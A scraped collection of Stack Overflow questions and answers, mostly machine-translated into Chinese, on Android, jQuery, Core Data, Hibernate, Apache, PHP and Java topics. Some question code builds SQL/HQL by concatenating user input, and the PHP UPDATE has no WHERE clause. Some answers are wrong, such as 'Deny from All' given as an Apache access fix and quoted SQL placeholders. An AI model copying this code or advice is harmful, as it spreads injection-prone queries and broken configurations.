## 回答 #3

> 赞同：0
> 
> 时间：2016-01-07T10:48:29.273

I can think of 2 reasons for this to fail:

1.  The interpreter you have configured doesn't have the .py files, only .pyc files (for PyDev to work properly, you need to have an interpreter with the actual .py files).

2.  The interpreter is not properly configured (i.e.: you created some virtualenv which references a parent env but the paths from the parent env were not properly added in the interpreter configuration) -- i.e.: the `/Lib` which has the `unittest` package (with `unittest/__init__.py`) is not added to the **PYTHONPATH** at preferences > pydev > interpreters > python interpreter > select interpreter > libraries).

# jquery - 在 jQuery UI 中：如何使用单独的 html 文件作为选项卡的内容

> ID：13845713
> 
> 赞同：2
> 
> 时间：2012-12-12T17:53:10.873
> 
> 标签：jquery, html, jquery-ui

当我使用 jQuery UI 选项卡创建选项卡式页面时，我必须将内容放在同一个 html 文件中的所有选项卡下，这会导致文件变得很大。有没有办法在不使用 ajax 调用的情况下在每个选项卡下公开不同的 html 文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:56:44.180

您可以将其放在每个选项卡中。

```
<!--#include virtual="path to file/include-file.html" --> 
```

# android - 相对布局的背景没有填满整个屏幕

> ID：13845714
> 
> 赞同：0
> 
> 时间：2012-12-12T17:53:13.613
> 
> 标签：android, xml, android-edittext, screen

我在使用相对布局和背景时遇到问题。虽然我设置`android:layout_height="match_parent"`了，但背景并没有填满整个屏幕（屏幕高度），并且底部设置为白色。我只是将项目放在屏幕的顶部，但即便如此我也不相信这种行为是正确的。

我的代码xml：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical"
android:background="@drawable/background" >

<TextView
    android:id="@+id/title"
    android:layout_height="wrap_content"
    android:layout_width="wrap_content"
    android:text="@string/title"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="@dimen/dim_b"
    android:layout_marginLeft="@dimen/dim_a"
    android:layout_marginRight="@dimen/dim_a" />

<EditText 
    android:id="@+id/insert"
    android:hint="@string/insert"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_below="@id/title"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="@dimen/dim_c"
    android:layout_marginLeft="@dimen/dim_a"
    android:layout_marginRight="@dimen/dim_a"
    android:inputType="textPassword" />

<Button 
    android:id="@+id/accept"
    android:text="@string/accept"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_below="@id/insert"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="@dimen/dim_d"
    android:layout_marginLeft="@dimen/dim_a"
    android:layout_marginRight="@dimen/dim_a" />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:08:42.923

> 1.首先您使用的是相对布局，所以为什么需要从相对布局顶部删除orientation="vertical"
> 
> 2.Edittext ,Button 像这样 android:layout_below="@+id/title" 不是 android:layout_below="@id/title"

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:00:19.507

尝试： android:layout_height="fill_parent"

match_parent 处于 API 级别 8 及更高级别。

# iphone - iOS 核心数据轻量级迁移

> ID：13845720
> 
> 赞同：1
> 
> 时间：2012-12-12T17:53:20.507
> 
> 标签：iphone, ios, core-data, core-data-migration

我遇到了核心数据轻量级迁移的问题。带有第一个模型版本的应用程序已提交到 AppStore。然后是版本 2 的数据模型（**未**提交）。最后经过一些更改，我添加了模型的第 3 版并将其提交到 AppStore。

一切都在测试设备上运行良好，因为迁移是逐步完成的（v1 - v2 - v3）。

但它不适用于从 AppStore 更新应用程序的用户，例如它试图从版本 1 迁移到版本 3（*跳过版本 2*）。

我怎么解决这个问题？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-08T12:57:59.793

这是一个蛮力解决方案，但删除商店是解决您的问题的一种选择：

```
// Setup CoreData with MagicalRecord && remove CoreData store
// The flag is used to perform the delete just once
if (![[NSUserDefaults standardUserDefaults] boolForKey:@"CORE_DATA_FLAG01"]) {
    NSURL *storeURL =[NSPersistentStore MR_urlForStoreName:@"YourStore.sqlite"];
    LOG(@"%@", storeURL);
    NSFileManager *fm = [[NSFileManager alloc] init];
    NSError *error = nil;
    [fm removeItemAtURL:storeURL error:&error];
    if (error) {
        LOG(@"error %@", error);
    } else {
        [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"CORE_DATA_FLAG01"];
    }
} 
```

我正在使用[MagicalRecord](https://github.com/magicalpanda/MagicalRecord)与 CoreData进行交互。在这种情况下，我使用该函数来获取商店。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-05T08:15:50.807

通过轻量级迁移，如果 V1->V2 有效且 V2->V3 有效，那么直接从 V1->V3 迁移应该不会有问题 - 除非您搞砸了。:)

启动 V1 版本，然后切换到 V3 并逐步调试问题。

```
NSDictionary *options = @{
                          NSMigratePersistentStoresAutomaticallyOption: @YES,
                          NSInferMappingModelAutomaticallyOption: @YES
                         };
NSError *error;
NSPersistentStore *persistentStore = [persistentStoreCoordinator addPersistentStoreWithType:NSSQLiteStoreType configuration:nil URL:storeUrl options:options error:&error];
if (!persistentStore) {
    NSLog(@"migration failed: %@", error);
} 
```

# grid - Kendo UI Grid：可以允许在指定列上而不是在其他列上进行分组

> ID：13845721
> 
> 赞同：4
> 
> 时间：2012-12-12T17:53:22.180
> 
> 标签：grid, grouping, kendo-ui

使用 Kendo UI 网格（由 Telerik 提供）是否可以允许在某些列上进行分组而在其他列上不允许？演示示例显示`groupable: true`为网格级属性。文档内容为`groupable Boolean | Object(default: false)`. 是否可以在列对象上将`groupable`属性设置为*false*，以覆盖列级别的网格级别可分组性？

```
$("#grid").kendoGrid({
 dataSource: {
     data: createRandomData(50),
     pageSize: 10
 },
 columns: [
     {
         field: "Name"
     },
     {
         groupable: false,    /*  ?prevent grouping on birthdate? */
         field: "BirthDate",
         title: "Birth Date",
         template: '#= kendo.toString(BirthDate,"dd MMMM yyyy") #'
    }
 ],
  groupable: true 
```

});

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T20:42:52.930

是的，你几乎自己回答了你的问题。是的，您可以，这是示例列定义。

```
 {
        "title": "Birth Date",
        "field": "BirthDate",
        "groupable": false
 } 
```

确保您使用的是 Q3 2012，我不确定以前的版本是否支持它。

# android - 行中的sqlite更新字段无法识别行ID的变量

> ID：13845725
> 
> 赞同：3
> 
> 时间：2012-12-12T17:53:36.267
> 
> 标签：android, sqlite, sql-update

我第一次尝试更新记录中的字段，但是在使用变量指定行时它没有保存更新。

问题背景 - 当用户单击图像时，将调用 checkDone() 函数，并传递行号 (i)。然后我为行 nbr (i) 设置了一个全局变量 (glbID)，并调用 updateDB 函数来更新指定行的状态字段。我从未收到错误消息，但是注意到该字段没有更新。当我对行 ID 进行硬编码时，它保存了更新。但是，使用 glbID var 以及另一个 strID 来查看它是否是格式类型问题，无法解决问题。尝试了其他几种变体均无济于事。

感谢任何人对此的帮助。正在使用 Android 模拟器进行测试，如果有任何其他信息有助于分析，请告诉我。

```
function checkDone(i) {
   var db = window.openDatabase("Database", "1.0", "GTKdb", 200000);
   glbID = i    //SET global variable to row nbr
   document.getElementsByTagName("img")[i].src = "img/checkbox_checked.png";
   db.transaction(updateDB, errorCB); 
}

function updateDB(u) {        
   var strDone = "DONE"
    var strID = "" + glbID;  //SET new variable to glbID, converting to string to see if format type issue

    u.executeSql('UPDATE USER set status = ? where id = ?', [strDone,"2"], successCB, errorCB); //THIS WORKS WHEN ID value hardcoded
   //u.executeSql('UPDATE USER set status = ? where id = ?', [strDone,glbID], successCB, errorCB); //NO UPDATE using var glbID
   //u.executeSql('UPDATE USER set status = ? where id = ?', strDone,strID], successCB, errorCB); //NO UPDATE using var strID
    alert('AFTER UPDATE Status= '+status);  //No value for status appears
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T09:30:35.167

我不确定，但这可能是问题所在。当您插入字符串时，您需要在引号内给出它。

```
'UPDATE USER set status = "?" where id = ?' 
```

希望能帮助到你。

# java - 休眠延迟加载不起作用

> ID：13845729
> 
> 赞同：-3
> 
> 时间：2012-12-12T17:53:43.353
> 
> 标签：java, spring, hibernate, lazy-loading

我在使用 Hibernate 延迟加载时遇到了一些问题。请参阅下面我的实体：

```
@Entity
@Table(name = "diagnoses")
public class Diagnosis extends Domain implements IDiagnosis {

    @Column(name = "short_name")
    private String shortName;

    @Column(name = "full_name")
    private String fullName;

    @Column(name = "code")
    private int code;

    @OneToMany(fetch = FetchType.LAZY, targetEntity = Anamnesis.class, cascade = CascadeType.ALL,
        orphanRemoval = true)
    @JoinColumn(name = "diagnoses_id", nullable = false)
    private Set<IAnamnesis> anamneses = new HashSet<>();

    @OneToMany(fetch = FetchType.LAZY, targetEntity = Complaint.class, cascade = CascadeType.ALL,
        orphanRemoval = true)
    @JoinColumn(name = "diagnoses_id", nullable = false)
    private Set<IComplaint> complaints = new HashSet<>();
        ...
} 
```

但是当我在测试 findAll() 或 findById() 方法中调用时，休眠初始化集合......

```
@Service("diagnosisService")
public class DiagnosisService implements IDiagnosisService {

    @Autowired
    private IDiagnosisRepository diagnosisRepository;

    @Override
    @Transactional(propagation = Propagation.REQUIRED, readOnly = false)
    public IDiagnosis getById(String id) {
        return diagnosisRepository.findById(id);
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRED, readOnly = false)
    public boolean saveOrUpdate(IDiagnosis diagnosis) {
        boolean result = false;
        if (diagnosis != null) {
            if (StringUtils.isEmpty(diagnosis.getId())) {
                diagnosisRepository.insert(diagnosis);
                result = true;
            } else {
                diagnosisRepository.update(diagnosis);
                result = true;
            }
        }
        return result;
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRED, readOnly = false)
    public boolean delete(IDiagnosis diagnosis) {
        boolean deleted = false;
        if (diagnosis != null) {
            diagnosisRepository.delete(diagnosis);
            deleted = true;
        }
        return deleted;
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRED, readOnly = true)
    public List<IDiagnosis> getAll() {
        return diagnosisRepository.findAll();
    }

public class DiagnosisRepository{
... 
    public T findById(ID id) {
        T t = null;
        List<T> data = sessionFactory.getCurrentSession().createQuery(String.format("from %s where id='%s'",
            getClassName(), id)).list();
        if (CollectionUtils.isNotEmpty(data)) {
            t = data.get(FIRST_ENTITY);
        }
        return t;
    }

    /**
     * {@inheritDoc}
     */
    @Override
    public List<T> findAll() {
        return sessionFactory.getCurrentSession().createQuery(String.format("from %s", getClassName())).list();
    }
... 
} 
```

我使用 Hibernate 4。为什么会这样？也许它有额外的设置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T04:34:05.947

为什么你认为它被初始化了？在调试时，您是否看到集合中的已初始化字段设置为 true？您是否尝试过在事务之外访问集合。它应该通过一个 LazyInitializationException。

顺便说一句， [Onetomany](http://docs.oracle.com/javaee/5/api/javax/persistence/OneToMany.html)映射默认是惰性的。您无需明确提及。

# amazon-ec2 - 减少 EC2 实例的硬盘存储

> ID：13845737
> 
> 赞同：1
> 
> 时间：2012-12-12T17:54:05.627
> 
> 标签：amazon-ec2

有什么办法可以减小 EC2 实例的大小？[我遵循了此处](https://stackoverflow.com/questions/6151695/ec2-instace-on-amazon-and-i-am-greeted-with-no-space-left-on-the-disk)提出的方法，但是当我在创建新卷时尝试减小实例大小时，我被阻止这样做。错误消息说新卷只能是相同大小或更大。

谢谢，斯科特

# jquery - jQuery .text() 函数不起作用

> ID：13845740
> 
> 赞同：1
> 
> 时间：2012-12-12T17:54:13.980
> 
> 标签：jquery, jquery-selectors

所以我试图让用户点击一个按钮，按钮值包含一个问题编号和一个 div id。然后，我尝试使用该问题编号来访问具有 id question_no"+_text 的跨度中的文本。我应该获取文本的行是：

```
var text=$("div#"+div+" span#"+question_no+"_text").text(); 
```

问题是它有一半的时间工作。它会在某些跨度上抓取文本，但不会在其他跨度上抓取文本。

H这是我写的脚本：

```
$("button.add_answer").click(function() {
    var question_no=$(this).attr("value")
    var div=$(this).attr("data-version");
    var text=$("div#"+div+" span#"+question_no+"_text").text();
    var answer=$("div#"+div+" [name="+question_no+"]");
    var answerText;
    var answerValue;
    var checkbox=false;

    alert($("div#"+div+" span#"+question_no+"_text").length);

    if (answer[0].tagName.toLowerCase() == "input") {
        if(answer.attr("type") == "text") {
             answerText=answer.val();
             answerValue=answer.val();  
        } else if (answer.attr("type") == "radio") {
             var answer=$("div#"+div+" [name="+question_no+"]:checked");
             answerValue=answer.val();
             answerText=answer.next().text();
        } else {
             alert("checkbox");
             checkbox=true;
             $("div#"+div+" [name="+question_no+"]:checked").each(function() {
                 answerText=$(this).next().text();
                 answerValue=$(this).val();
                 $("div#saved_answers table").append("<tr id=\""+question_no+"\"><td>"+text+"</td><td>"+answerText+"</td></tr>");
             });    
        }
    } else if (answer[0].tagName.toLowerCase()=="textarea") {
         answerText=answer.val();
         answerValue=anser.val();   
    } else if(answer[0].tagName.toLowerCase == "select") {
         answerText=answer.find("option:selected").text();
         answerVal=answer.val();    
    }

    if(!checkbox) {
        $("div#saved_answers table").append("<tr id=\""+question_no+"\"><td>"+text+"</td><td>"+answerText+"</td></tr>");
    }

}); 
```

这是标记：

```
<div id="1527" class="Questions">
<h1>Questions</h1><hr><br />

    <ul class="error" id="498_error"></ul>
    <span id="498_text">Title of Representative Completing This Section</span><br />
    <input type="hidden" name="498_max_length" id="498_max_length" value="25">
    <input type="hidden" name="498_min_value" id="498_min_value" value="">
    <input type="hidden" name="498_max_value" id="498_max_value" value="">
    <input type="hidden" name="498_regex_format" id="498_regex_format" value="">
    <input type="hidden" name="498_system_type" id="498_system_type" value="2">
    <input type="hidden" name="498_app_type_version" id="498_app_type_version" value="1527">

            <input class="questionChoice" type="text" name="498" />

    <br />
    <button class="add_answer" value="498" data-version="1527">Add answer</button>
    <br /><br />

    <ul class="error" id="2150_error"></ul>
    <span id="2150_text">Signature:</span><br />
    <input type="hidden" name="2150_max_length" id="2150_max_length" value="">
    <input type="hidden" name="2150_min_value" id="2150_min_value" value="">
    <input type="hidden" name="2150_max_value" id="2150_max_value" value="">
    <input type="hidden" name="2150_regex_format" id="2150_regex_format" value="">
    <input type="hidden" name="2150_system_type" id="2150_system_type" value="2">
    <input type="hidden" name="2150_app_type_version" id="2150_app_type_version" value="1527">

            <input class="questionChoice" type="text" name="2150" />

    <br />
    <button class="add_answer" value="2150" data-version="1527">Add answer</button>
    <br /><br />

</div> 
```

它正确地从第二个问题“签名”中获取文本，但不是第一个问题“完成本节的代表标题”。

在文本与输入一起被抓取后，我只是将它们放在一个表格中。

关于为什么这只会偶尔抓取文本的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:03:40.230

其中一个按钮具有“data-version”属性，另一个具有“data-app_type_version”属性。它们应该与您在 JS 中引用的内容相同（目前为“数据版本”）:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:10:43.907

由于您知道 span 是 div 的直接子代，也许您可​​以使用“>”使其成为直接后代选择器，而不是通用后代选择器。

var text=$("div#" + div + "> span#"+ question_no + "_text").text();

# apache2 - 阿帕奇 - 403 禁止

> ID：13845742
> 
> 赞同：0
> 
> 时间：2012-12-12T17:54:21.647
> 
> 标签：apache2

所以我试图将我的文件上传到我的 Ubuntu 服务器上的本地 apache。我安装了 apache2，现在我一直被 403 禁止。

我一直在寻找并寻找一些答案，说明为什么到目前为止在 stackoverflow 和其他地方，它没有产生任何结果。

/etc/apache2 中的文件是：apache2.conf（这个很大）、evvars、magic、ports.conf 和 httpd.conf（这个是空的，里面什么都没有）。

同样，一旦我解决了这个问题，有点离题，但我可以改变它，而不是输入本地 ip 地址或本地主机，这样我就可以输入类似 mysite.local/index.php 的内容？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:59:47.693

如果我猜对了，您尝试访问的目录可以从网络访问。

您需要一个[`<Directory>`](http://httpd.apache.org/docs/2.2/mod/core.html#directory)允许 apache 访问该目录的指令：

```
<Directory /your/path>
  Order Deny,Allow
  Deny from All
</Directory> 
```

`httpd.conf`为空是正常的。它已被弃用，因此您不应使用它。

如果您使用 linux，还请检查您的 apache 用户是否可以访问该目录：
用户通常在`/etc/apache2/envvars`文件中定义为`export APACHE_RUN_USER=www-data`. 因此，如果 apache 在用户下运行，则用户`www-data`应该可以访问该目录，`www-data`或者最好直接拥有该目录/文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-04T08:20:21.353

将静态文件夹上传到 apache 文件夹后，我遇到了同样的问题。但有些文件无法在浏览器中访问，出现 403 错误。

检查并修复@rekire 提到的文件权限和httpd.conf 文件后，问题仍然存在。

最后，我阅读了[http://www.petefreitag.com/item/793.cfm](http://www.petefreitag.com/item/793.cfm)上的帖子并做了以下事情：

`chcon -R --reference=/var/www /path/to/webroot`

然后问题就解决了。

我使用的是 CentOS 服务器。

# android - Android 和外部网站中的 SearchView

> ID：13845755
> 
> 赞同：0
> 
> 时间：2012-12-12T17:55:20.147
> 
> 标签：android, search, android-intent, searchview

我有以下情况：

1.  我开发了我的 android 应用程序，我想在其中添加“搜索”。
2.  有网站[顾问](http://www.consultant.ru/sys/english/)

这个网站是关于对律师等有用的法律服务。

1.  我想将我的应用程序中的“SearchView”与此网站中的“搜索”连接起来。换句话说，我想实现搜索将我的应用程序扔到这个网站，从中获取结果并显示在应用程序中（我认为它将是 ListView）

用例：1

1.  用户打开我的应用
2.  用户在 SearchView 中输入他的请求
3.  用户按下“搜索”按钮
4.  应用程序将此请求发送到网站
5.  网站在他里面搜索这个请求（不知道是怎么实现的）
6.  应用程序从网站获取结果
7.  应用显示结果

因为我是 Android 开发的初学者，所以我问你一个建议：

*   这是真的吗？
*   你能给我一些例子的链接来描述我的情况吗
*   如果是真的，你能给我一个类似实现的代码吗

谢谢！PS我的应用程序像开源一样创建

PPS 这是[此站点](http://www.consultant.ru/search/)中的搜索网站 我看到该网站使用`search/?q=` Where after = users request

```
Example: /search/?q=codex 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:09:07.290

您可以通过查看 Jsoup (http://jsoup.org/) 来做到这一点。Jsoup 是一个带有 Jquery 语法的 HTML Parser 库。文档很清楚，他们的例子很容易理解（如果你熟悉 Jquery）。

1.  首先，您在 EditText 中输入关键字。
2.  单击搜索，将关键字附加到 url（例如：/search/?q=codex）
3.  使用 Jsoup 连接到具有该 url 的网站。
4.  接收结果。
5.  从结果中提取数据。
6.  根据您的需要处理数据。

就是这样 ！

# android - Android Google Maps V2 更改我的位置图标

> ID：13845758
> 
> 赞同：17
> 
> 时间：2012-12-12T17:55:30.623
> 
> 标签：android, google-maps

我在我的应用程序中为用户的当前位置使用自定义图标，并希望在升级到新的 Google 地图库时保持这种方式。

使用 Google Maps v1 库，我扩展了 MyLocationOverlay 并覆盖了 drawMyLocation 方法以在其中绘制我的自定义图标。

GoogleMap 使用 setMyLocationEnabled 方法启用当前位置，但据我所知，无法自定义它。

有人知道如何在 v2 上完成此操作吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-13T06:56:57.540

在使用自定义图标的地图构造函数中创建一个标记。

```
_myLocation = mMap.addMarker(new MarkerOptions()
                      .position(MAP_CENTER)
                      .title("My Location")
                      .icon(BitmapDescriptorFactory.fromResource(R.drawable.mylocation))); 
```

实现位置更改侦听器， [https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/LocationSource.OnLocationChangedListener](https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/LocationSource.OnLocationChangedListener)

调用 Provider 时更新标记位置：

```
public void onLocationChanged (Location location)
{
    _myLocation.position(location); //May have to convert from location to LatLng
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-03T02:27:17.770

好的，所以我只是想如果你不添加标题或片段，标记将不会对点击事件产生影响，它会充当图像叠加层。虽然不完美，但很符合我的需求

```
private Marker marker = mMap.addMarker(new MarkerOptions()
                    .position( latLng)
                    .icon(BitmapDescriptorFactory.fromResource(R.drawable.arrow))); 
```

谢谢大家

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-21T08:51:44.937

肯定有一种方法可以在当前位置显示自定义图标。结帐[链接](https://developers.google.com/maps/documentation/android/marker)，您将获得更多想法来自定义地图上的图标。

试试下面的代码：

```
 private static final LatLng MELBOURNE = new LatLng(-37.81319, 144.96298);
 private Marker melbourne = mMap.addMarker(new MarkerOptions()
                        .position(MELBOURNE)
                        .title("Melbourne")
                        .snippet("Population: 4,137,400")
                        .icon(BitmapDescriptorFactory.fromResource(R.drawable.arrow))); 
```

# php - 将可变大小的表单转换为 javascript 和 PHP (AJAX)

> ID：13845765
> 
> 赞同：4
> 
> 时间：2012-12-12T17:56:15.217
> 
> 标签：php, javascript, ajax

背景 - 我有一个包含一堆按钮的网页（想想 POS 系统）。我希望用户能够编辑按钮的名称（用于将它们按特定顺序排列）和按钮的文本，其中包含项目和成本两部分。目前我通过将数据从 PHP 页面（编辑完成的地方）传递到另一个 PHP 页面（我将其写回数据库）来工作，但我想使用更多的 AJAX 方法并将其传递给 js保存编辑时更新 a 的功能。由于按钮的数量非常多，我不知道要读入脚本的确切按钮数量。目前我有这样的东西......

```
echo "<td><input type='text' name='btn[]' size='5' value='" . $row['button'] . "'/></td>";
echo "<td><input type='text' name='itm[]' size='5' value='" . $row['item'] . "'/></td>";
echo "<td><input type='text' name='prc[]' size='5' value='" . $row['price'] . "'/></td>"; 
```

它被发送到我拥有的 PHP 页面...

```
$buttonArray = $_POST['btn'];
$itemArray = $_POST['itm'];
$priceArray = $_POST['prc'];

$numberofItems = count($itemArray);

for ($i=0; $i<$numberofItems; $i++)
{
$sql = "UPDATE concessions SET button = '".$buttonArray[$i]."', item = '".$itemArray[$i]."', price = '".$priceArray[$i]."'";
mysql_query($sql);
} 
```

我想在查看 document.form.elements 的 js 中做类似的事情，但不知道如何以某种东西（比如和数组）的形式发送我可以使用 for 循环来循环。欢迎任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T15:26:13.613

有一个非常简单的方法可以做到这一点：使用这个简单的 javascript 函数（确保你加载了最近的 jquery）

```
$.fn.serializeObject = function()
{
    var o = {};
    var a = this.serializeArray();
    $.each(a, function() {
        if (o[this.name] !== undefined) {
            if (!o[this.name].push) {
                o[this.name] = [o[this.name]];
            }
            o[this.name].push(this.value || '');
        } else {
            o[this.name] = this.value || '';
        }
    });
    return o;
}; 
```

此函数将以正确的顺序序列化您的表单元素并输出一个 javascript 对象。您需要像这样将它与 ajax 一起使用才能解析您的值：

```
var objects = $("#ID_OF_YOUR_FORM").serializeObject();

$.ajax({
   url: "your_ajax_file_location.php",
   type: "POST",
   data: ({
       objects:objects,
       otherdata:otherdata
     }),
   success: function(msg){
        /* do whatever here */
    }
 }); 
```

Ajax 将发挥它的魔力并自动将该对象转换为 php 数组并将其发布到 php...试试这个：

```
echo "<pre>".$_POST['objects']."</pre>"; 
```

php 数组应如下所示：

```
{
    btn= array(
               "your btn1 info",
               "your btn2 info",
               "your btn3 info"
               );

    itm= array(
               "your itm1 info",
               "your itm2 info",
               "your itm3 info"
               );

    prc= array(
               "your prc1 info",
               "your prc2 info",
               "your prc3 info"
               );

} 
```

从这种类型的数组中，很容易在 php 中操作以更新您的数据库

# java - 将方法更改为类

> ID：13845767
> 
> 赞同：-5
> 
> 时间：2012-12-12T17:56:18.807
> 
> 标签：java

我刚开始学习如何用java编写代码。我想把代码分解成类，这样每个方法都是一个类。下面的代码从解决方案生成数独游戏。谢谢你的帮助。

通过蛮力生成数独谜题

```
import java.util.Random;
public class SudokuPuzzle
{
    public int[][] puzzle = new int[9][9];        // Generated puzzle.
    public int[][] solved_puzzle = new int[9][9]; // The solved puzzle.

private int[][] _tmp_grid = new int[9][9]; // For the solver
private Random rand = new Random();
private short solution_count; // Should be 1

/**
   * Constructor generates a new puzzle, and its solution
   */
public SudokuPuzzle()
{
    generateSolvedPuzzle(0);
    generatePuzzle();
}

/**
 * Finds a solved puzzle through depth-first search
 */
private boolean generateSolvedPuzzle(int cur_cell)
{
    if (cur_cell > 80)
        return true;

    int col = cur_cell % 9;
    int row = cur_cell / 9;

    // create a sequence of the integers {1,...,9} of random order
    int [] numbers = new int[9];
    for (int i=0; i < 9; i++)
        numbers[i] = 1+i;
    shuffle_array(numbers);

    for (int i=0; i < 9; i++)
    {
        int n = numbers[i]; // for the next number in the array
        // if number is acceptable by Sudoku rules
        if (!existsInColumn(solved_puzzle, n, col)
                && !existsInRow(solved_puzzle, n, row)
                && !existsInSubGrid(solved_puzzle, n, row, col))
        {
            // attempt to fill in the next cell with the current cell set to number
            solved_puzzle[row][col] = n;
            if (generateSolvedPuzzle(cur_cell + 1))
                return true;
            solved_puzzle[row][col] = 0; // didn't work, reset cell and try the next number in sequence
        }
    }
    return false; // unreachable (since search is exhaustive and a solved puzzle must exist)
}

/**
 * Solves the Sudoku puzzle through depth-first, exhaustive search, and store the number of
 * solutions in solution_count. Currently, we want to use this only to detect if two solutions
 * exist. Hence, we stop the search as soon as two solutions have been found.
 *
 *
 */
private boolean _solvePuzzle(int cur_cell)
{
    if (cur_cell > 80)
    {
        solution_count++;
        if (solution_count > 1) // two solutions detected. notify caller to abort search
            return true;
        return false;
    }

    int col = cur_cell % 9;
    int row = cur_cell / 9;

    if (_tmp_grid[row][col] == 0) // if cell is unfilled
    {
        for (int n=1; n <= 9; n++) // for each number
        {
            // if number is acceptable by Sudoku rules
            if (!existsInColumn(_tmp_grid, n, col)
                    && !existsInRow(_tmp_grid, n, row)
                    && !existsInSubGrid(_tmp_grid, n, row, col))
            {
                // attempt to fill in the next cell with the current cell set to number
                _tmp_grid[row][col] = n;
                if (_solvePuzzle(cur_cell + 1)) // notified of two solutions being detected
                    return true; // notify caller to abort search
                _tmp_grid[row][col] = 0; // try with other numbers
            }
        }
    }
    else
        if (_solvePuzzle(cur_cell + 1)) // notified of two solutions being detected
            return true; // notify caller to abort search

    return false;
}

private void shuffle_array(int array[])
{
    // swap the first size elements with other elements from the whole array
    for (int i = 0; i < array.length; i++)
    {
        // find an index j (i<j<=array_length) to swap with the element i
        int j = i + rand.nextInt(array.length - i);
        int t = array[j];
        array[j] = array[i];
        array[i] = t;
    }
}

/**
 * Returns whether a given number exists in a given column.
 *
 * @param col    column to check.
 * @param number number to check.
 * @return       true iff number exists in row.
 */
private boolean existsInColumn(int[][] puzzle, int number, int col)
{
    for (int row = 0; row < 9; row++)
        if (puzzle[row][col] == number)
            return true;
    return false;
}

/**
 * Returns whether a given number exists in a given row.
 *
 * @param row    row to check.
 * @param number number to check.
 * @return       true iff number exists in row.
 */
private boolean existsInRow(int[][] puzzle, int number, int row)
{
    for (int col = 0; col < 9; col++)
        if (puzzle[row][col] == number)
            return true;
    return false;
}

/**
 * Returns whether if the 3x3 sub-grid which includes (row, col) contains a
 * cell with the given number.
 *
 * @param row    a row in the sub-grid.
 * @param col    a col in the sub-grid.
 * @param number number to check.
 * @return       true iff sub-grid contains number.
 */
private boolean existsInSubGrid(int[][] puzzle, int number, int row, int col)
{
    int sub_grid_start_row = (row / 3)*3;
    int sub_grid_start_col = (col / 3)*3;
    for (int _row = sub_grid_start_row; _row < sub_grid_start_row + 3; _row++)
        for (int _col = sub_grid_start_col; _col < sub_grid_start_col + 3; _col++)
            if (puzzle[_row][_col] == number)
                return true;
    return false;
}

/**
 * Generates a Sudoku puzzle from a solved puzzle by setting up to 64 cells to 0.
 * (We cannot set more than 64 cells to 0\. 
 */
private void generatePuzzle()
{
    // copy solved_puzzle to puzzle
    for (int row = 0; row < 9; row++)
        for (int col = 0; col < 9; col++)
            puzzle[row][col] = solved_puzzle[row][col];

    // create a sequence of the integers {0,...,80} of random order
    int [] cell_sequence = new int[81];
    for (int i=0; i < 81; i++)
        cell_sequence[i] = i;
    shuffle_array(cell_sequence);

    // attempt to set each cell in the sequence to 0
    int count_set_to_zero = 0;
    for (int i=0; i < 81 && count_set_to_zero < 64; i++)
    {
        int cur_cell = cell_sequence[i];
        int col = cur_cell % 9;
        int row = cur_cell / 9;
        int sav = puzzle[row][col];
        puzzle[row][col] = 0;
        solution_count = 0;

        // copy puzzle to _tmp_grid for the solver to work on
        for (int r = 0; r < 9; r++)
            for (int c = 0; c < 9; c++)
                _tmp_grid[r][c] = puzzle[r][c];

        if (_solvePuzzle(0)) // Puzzle allows more than 1 solution
            puzzle[row][col] = sav; // Revert to original puzzle
        else
            count_set_to_zero++;
    }
}

public void showSolution()
{
    for (int row = 0; row < 9; row++)
    {
        System.out.print("  ");
        for (int col = 0; col < 9; col++)
            System.out.print(" " + solved_puzzle[row][col]);
        System.out.println();
    }
}

public void show()
{
    for (int row = 0; row < 9; row++)
    {
        System.out.print("  ");
        for (int col = 0; col < 9; col++)
            System.out.print(" " + puzzle[row][col]);
        System.out.println();
    }
}

public static void main(String[] args)
{
    SudokuPuzzle sudoku_puzzle = new SudokuPuzzle();
    System.out.println("Puzzle:");
    sudoku_puzzle.show();
    System.out.println();
    System.out.println("Solution:");
    sudoku_puzzle.showSolution();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:15:06.063

由于您的问题没有直接的答案，因此我将发表一些咆哮，希望可以让您摆脱困境。您要求的内容比“我想将其从方法更改为类”要加载得多，主要是因为*它不是那么简单*。

设计一门课程需要大量的计划和理解。我将假设您在上面粘贴的代码没有真正通过它就可以工作，并希望可以从中得出一些示例。

正如其他人已经指出的那样，您不能将方法转换为类，因为类*包含*方法。但是看看你的代码，你似乎在问“我怎样才能把这个单一的类变成多个”。它本质上是一个设计问题。

